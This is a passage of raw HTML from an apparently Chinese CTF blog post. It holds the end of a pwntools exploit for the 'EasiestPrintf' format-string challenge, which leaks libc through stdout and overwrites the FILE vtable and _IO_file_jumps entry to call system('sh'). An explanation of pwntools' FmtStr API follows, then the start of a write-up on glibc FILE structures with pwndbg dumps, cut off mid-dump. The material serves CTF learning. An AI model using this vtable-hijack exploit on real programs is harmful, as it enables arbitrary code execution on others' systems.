class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">bss_addr = elf.bss</div><div class=\"line\">_IO_stdout_got = <span class=\"number\">0x0804A044</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\">def exe_fmt(payload):</div><div class=\"line\">    p = process('./EasiestPrintf')</div><div class=\"line\">    p.recvuntil('read:\\n')</div><div class=\"line\">    p.sendline(str(_IO_stdout_addr))</div><div class=\"line\">    p.recvuntil('Good Bye\\n')</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    return p.recvall()</div><div class=\"line\">'''</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">    p.sendline(str(_IO_stdout_got))</div><div class=\"line\">    _IO_stdout_addr = int(p.recvline(), <span class=\"number\">16</span>)</div><div class=\"line\">    p.recvline(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'_IO_stdout_addr =&gt; '</span>, hex(_IO_stdout_addr)</div><div class=\"line\">    libc.address = _IO_stdout_addr - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    _IO_file_jumps_addr = libc.symbols[<span class=\"string\">'_IO_file_jumps'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'_IO_file_jumps =&gt; '</span>, hex(libc.symbols[<span class=\"string\">'_IO_file_jumps'</span>])</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exe_fmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">        p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">        p.sendline(str(_IO_stdout_got))</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">        p.sendline(payload)</div><div class=\"line\">        <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\">    fmt = FmtStr(exe_fmt)  <span class=\"comment\"># init</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_addr = 'sh\\x00\\x00'</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_addr - 4 = &amp;system</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_vtable+0x1c = &amp;(libc_stdout-4)       _IO_file_xsputn</span></div><div class=\"line\">    writes = &#123;_IO_stdout_addr:<span class=\"number\">26739</span><span class=\"number\">-16</span>, <span class=\"comment\"># 'sh\\x00\\x00'</span></div><div class=\"line\">            _IO_stdout_addr<span class=\"number\">-4</span>:system_addr,</div><div class=\"line\">            _IO_file_jumps_addr+<span class=\"number\">0x1c</span>:_IO_stdout_addr<span class=\"number\">-4</span>&#125;</div><div class=\"line\">    payload = fmtstr_payload(fmt.offset, writes, <span class=\"number\">0</span>, <span class=\"string\">'byte'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    </div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>最后的payload使180长度，但是最大长度是158- -。。</p>\n<h2 id=\"关于FmtStr\"><a href=\"#关于FmtStr\" class=\"headerlink\" title=\"关于FmtStr\"></a>关于FmtStr</h2><p>pwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用<code>hhn</code>来修改的（因为只能指定一个只能为<code>hhn</code>or<code>hn</code>or<code>n</code>中的一种来生成payload），大概是作者懒了没想设计别的算法把- -</p>\n<p>先看下给出的example<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>program = tempfile.mktemp()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>source  = program + <span class=\"string\">\".c\"</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>write(source, <span class=\"string\">'''</span></div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;stdio.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;stdlib.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;unistd.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;sys/mman.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#define MEMORY_ADDRESS ((void*)0x11111000)</div><div class=\"line\"><span class=\"meta\">... </span>#define MEMORY_SIZE 1024</div><div class=\"line\"><span class=\"meta\">... </span>#define TARGET ((int *) 0x11111110)</div><div class=\"line\"><span class=\"meta\">... </span>int main(int argc, char const *argv[])</div><div class=\"line\"><span class=\"meta\">... </span>&#123;</div><div class=\"line\"><span class=\"meta\">... </span>       char buff[1024];</div><div class=\"line\"><span class=\"meta\">... </span>       void *ptr = NULL;</div><div class=\"line\"><span class=\"meta\">... </span>       int *my_var = TARGET;</div><div class=\"line\"><span class=\"meta\">... </span>       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</div><div class=\"line\"><span class=\"meta\">... </span>       if(ptr != MEMORY_ADDRESS)</div><div class=\"line\"><span class=\"meta\">... </span>       &#123;</div><div class=\"line\"><span class=\"meta\">... </span>               perror(\"mmap\");</div><div class=\"line\"><span class=\"meta\">... </span>               return EXIT_FAILURE;</div><div class=\"line\"><span class=\"meta\">... </span>       &#125;</div><div class=\"line\"><span class=\"meta\">... </span>       *my_var = 0x41414141;</div><div class=\"line\"><span class=\"meta\">... </span>       write(1, &amp;my_var, sizeof(int *));</div><div class=\"line\"><span class=\"meta\">... </span>       scanf(\"%s\", buff);</div><div class=\"line\"><span class=\"meta\">... </span>       dprintf(2, buff);</div><div class=\"line\"><span class=\"meta\">... </span>       write(1, my_var, sizeof(int));</div><div class=\"line\"><span class=\"meta\">... </span>       return 0;</div><div class=\"line\"><span class=\"meta\">... </span>&#125;''')</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>cmdline = [<span class=\"string\">\"gcc\"</span>, source, <span class=\"string\">\"-Wno-format-security\"</span>, <span class=\"string\">\"-m32\"</span>, <span class=\"string\">\"-o\"</span>, program]</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>process(cmdline).wait_for_close()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\"><span class=\"meta\">... </span>    p = process(program)</div><div class=\"line\"><span class=\"meta\">... </span>    p.sendline(payload)</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\">...</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>autofmt = FmtStr(exec_fmt)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>offset = autofmt.offset</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>p = process(program, stderr=PIPE)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>addr = unpack(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>payload = fmtstr_payload(offset, &#123;addr: <span class=\"number\">0x1337babe</span>&#125;)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>p.sendline(payload)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> hex(unpack(p.recv(<span class=\"number\">4</span>)))</div><div class=\"line\"><span class=\"number\">0x1337babe</span></div></pre></td></tr></table></figure></p>\n<p>主要就是一个类，一个函数：<br><code>class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</code><br><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) → str</code></p>\n<p>其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。</p>\n<ul>\n<li>execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息</li>\n<li>offset 偏移，没有给出的话会通过栈泄露自动给出</li>\n<li>padlen payload之前填充的字符数</li>\n<li>numbwritem 生成的此payload（包括填充）之前的偏移量</li>\n</ul>\n<p>看了看源码，发现<code>成员名</code>和<code>参数名</code>是同名的，直接调用即可。我们其实可以主要用这个来得到<code>FmtStr.offset</code>即可。<br>实例化一个类后，通过<code>write(addr, data)</code>来控制想要修改的地址和数据，可以通过一个字典来传参<strong>（data(int)）</strong>。<br>最后通过<code>execute_writes()</code>方法来调用<code>fmtstr_payload</code>生成payload并发送出去。</p>\n<p>我们也可以直接调用<code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code>这个方法来只生成payload。<br>给下参数，没啥特别的</p>\n<ul>\n<li>offset (int) – the first formatter’s offset you control</li>\n<li>writes (dict) – dict with addr, value {addr: value, addr2: value2}</li>\n<li>numbwritten (int) – number of byte already written by the printf function</li>\n<li>write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。</p>\n<h2 id=\"FILE结构体\"><a href=\"#FILE结构体\" class=\"headerlink\" title=\"FILE结构体\"></a>FILE结构体</h2><p>首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。</p>\n<p>以下所有关键词搜索命令为<br><code>grep -rn &quot;struct _IO_FILE {&quot; --include=&quot;*.h&quot; /usr/include</code></p>\n<p>其中<code>_IO_2_1_stdout_</code>的结构体如下：</p>\n<p><code>glibc-2.24/libio/libio.h</code><br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stdin_;</div><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stdout_;</div><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stderr_;</div></pre></td></tr></table></figure></p>\n<p>我们查看<code>_IO_FILE_plus</code>的结构体定义<br><code>/root/desktop/glibc-2.24/libio/libioP.h</code><br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></div><div class=\"line\">   This contains a pointer to the function jump table used.</div><div class=\"line\">   This is for compatibility with C++ streambuf; the word can</div><div class=\"line\">   be used to smash to a pointer to a virtual function table. */</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _IO_FILE file;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_jump_t</span></span> *vtable;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。</p>\n<p>下面来查看两个关键结构<code>_IO_FILE</code>和<code>_IO_jump_t</code>：<br><code>_IO_FILE</code>在<code>/usr/include/libio.h</code>中<br><figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct <span class=\"variable\">_IO_FILE</span> &#123;</div><div class=\"line\">  int <span class=\"variable\">_flags</span>;\t\t<span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_ptr</span>;\t<span class=\"comment\">/* Current read pointer */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_end</span>;\t<span class=\"comment\">/* End of get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_base</span>;\t<span class=\"comment\">/* Start of putback+get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_base</span>;\t<span class=\"comment\">/* Start of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_ptr</span>;\t<span class=\"comment\">/* Current put pointer. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_end</span>;\t<span class=\"comment\">/* End of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_base</span>;\t<span class=\"comment\">/* Start of reserve area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_end</span>;\t<span class=\"comment\">/* End of reserve area. */</span></div><div class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_base</span>; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_backup_base</span>;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_end</span>; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></div><div class=\"line\"></div><div class=\"line\">  struct <span class=\"variable\">_IO_marker</span> *<span class=\"variable\">_markers</span>;</div><div class=\"line\"></div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *<span class=\"variable\">_chain</span>;</div><div class=\"line\"></div><div class=\"line\">  int <span class=\"variable\">_fileno</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></div><div class=\"line\">  int <span class=\"variable\">_blksize</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">  int <span class=\"variable\">_flags2</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"variable\">_IO_off_t</span> <span class=\"variable\">_old_offset</span>; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></div><div class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class=\"line\">  unsigned short <span class=\"variable\">_cur_column</span>;</div><div class=\"line\">  signed char <span class=\"variable\">_vtable_offset</span>;</div><div class=\"line\">  char <span class=\"variable\">_shortbuf</span>[<span class=\"number\">1</span>];</div><div class=\"line\"></div><div class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"variable\">_IO_lock_t</span> *<span class=\"variable\">_lock</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p><code>_IO_jump_t</code>在<code>/root/desktop/glibc-2.24/libio/fileops.c</code>中<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">const struct _IO_jump_t _IO_file_jumps libio_vtable =</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT_DUMMY,</span></div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(finish, </span>_IO_file_finish),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(overflow, </span>_IO_file_overflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(underflow, </span>_IO_file_underflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(uflow, </span>_IO_default_uflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(pbackfail, </span>_IO_default_pbackfail),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsputn, </span>_IO_file_xsputn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsgetn, </span>_IO_file_xsgetn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekoff, </span>_IO_new_file_seekoff),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekpos, </span>_IO_default_seekpos),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(setbuf, </span>_IO_new_file_setbuf),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(sync, </span>_IO_new_file_sync),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(doallocate, </span>_IO_file_doallocate),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(read, </span>_IO_file_read),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(write, </span>_IO_new_file_write),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seek, </span>_IO_file_seek),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(close, </span>_IO_file_close),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(stat, </span>_IO_file_stat),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(showmanyc, </span>_IO_default_showmanyc),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(imbue, </span>_IO_default_imbue)</div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure></p>\n<p>再结合gdb查看内存能够得到更直观的理解：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\">wndbg&gt; telescope <span class=\"number\">0xf771fd60</span> <span class=\"number\">40</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class=\"number\">0xfbad2887</span></div><div class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│   <span class=\"number\">0xf771fd64</span> (_IO_2_1_stdout_+<span class=\"number\">4</span>) —▸ <span class=\"number\">0xf771fda7</span> (_IO_2_1_stdout_+<span class=\"number\">71</span>) ◂— <span class=\"number\">0x7208700a</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0xf771fd80</span> (_IO_2_1_stdout_+<span class=\"number\">32</span>) —▸ <span class=\"number\">0xf771fda8</span> (_IO_2_1_stdout_+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf7720870</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│   <span class=\"number\">0xf771fd84</span> (_IO_2_1_stdout_+<span class=\"number\">36</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">0d</span>:<span class=\"number\">0034</span>│   <span class=\"number\">0xf771fd94</span> (_IO_2_1_stdout_+<span class=\"number\">52</span>) —▸ <span class=\"number\">0xf771f5a0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></div><div class=\"line\">0e:<span class=\"number\">0038</span>│   <span class=\"number\">0xf771fd98</span> (_IO_2_1_stdout_+<span class=\"number\">56</span>) ◂— <span class=\"number\">0x1</span></div><div class=\"line\">0f:003c│   <span class=\"number\">0xf771fd9c</span> (_IO_2_1_stdout_+<span class=\"number\">60</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│   <span class=\"number\">0xf771fda0</span> (_IO_2_1_stdout_+<span class=\"number\">64</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│   <span class=\"number\">0xf771fda4</span> (_IO_2_1_stdout_+<span class=\"number\">68</span>) ◂— <span class=\"number\">0xa000000</span></div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│   <span class=\"number\">0xf771fda8</span> (_IO_2_1_stdout_+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf7720870</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">13</span>:004c│   <span class=\"number\">0xf771fdac</span> (_IO_2_1_stdout_+<span class=\"number\">76</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">15</span>:<span class=\"number\">0054</span>│   <span class=\"number\">0xf771fdb4</span> (_IO_2_1_stdout_+<span class=\"number\">84</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">16</span>:<span class=\"number\">0058</span>│   <span class=\"number\">0xf771fdb8</span> (_IO_2_1_stdout_+<span class=\"number\">88</span>) —▸ <span class=\"number\">0xf771f4e0</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">17</span>:005c│   <span class=\"number\">0xf771fdbc</span> (_IO_2_1_stdout_+<span class=\"number\">92</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\">1a:<span class=\"number\">0068</span>│   <span class=\"number\">0xf771fdc8</span> (_IO_2_1_stdout_+<span class=\"number\">104</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">1b</span>:006c│   <span class=\"number\">0xf771fdcc</span> (_IO_2_1_stdout_+<span class=\"number\">108</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">25</span>:<span class=\"number\">0094</span>│   <span class=\"number\">0xf771fdf4</span> (_IO_2_1_stdout_+<span class=\"number\">148</span>) —▸ <span class=\"number\">0xf771d960</span> (_IO_file_jumps) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">26</span>:<span class=\"number\">0098</span>│   <span class=\"number\">0xf771fdf8</span> (stderr) —▸ <span class=\"number\">0xf771fcc0</span> (_IO_2_1_stderr_) ◂— <span class=\"number\">0xfbad2087</span></div><div class=\"line\"><span class=\"number\">27</span>:009c│   <span class=\"number\">0xf771fdfc</span> (stdout) —▸ <span class=\"number\">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class=\"number\">0xfbad2887</span></div><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0xf771d960</span> <span class=\"number\">30</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0xf771d960</span> (_IO_file_jumps) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│   <span class=\"number\">0xf771d968</span> (_IO_file_jumps+<span class=\"number\">8</span>) —▸ <span class=\"number\">0xf75d6040</span> (_IO_file_finish) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">edi</span></div><div class=\"line\"><span class=\"number\">03</span>:000c│   <span class=\"number\">0xf771d96c</span> (_IO_file_jumps+<span class=\"number\">12</span>) —▸ <span class=\"number\">0xf75d6b00</span> (_IO_file_overflow) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│   <span class=\"number\">0xf771d970</span> (_IO_file_jumps+<span class=\"number\">16</span>) —▸ <span class=\"number\">0xf75d6810</span> (_IO_file_underflow) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│   <span class=\"number\">0xf771d974</span> (_IO_file_jumps+<span class=\"number\">20</span>) —▸ <span class=\"number\">0xf75d7a40</span> (_IO_default_uflow) ◂— <span 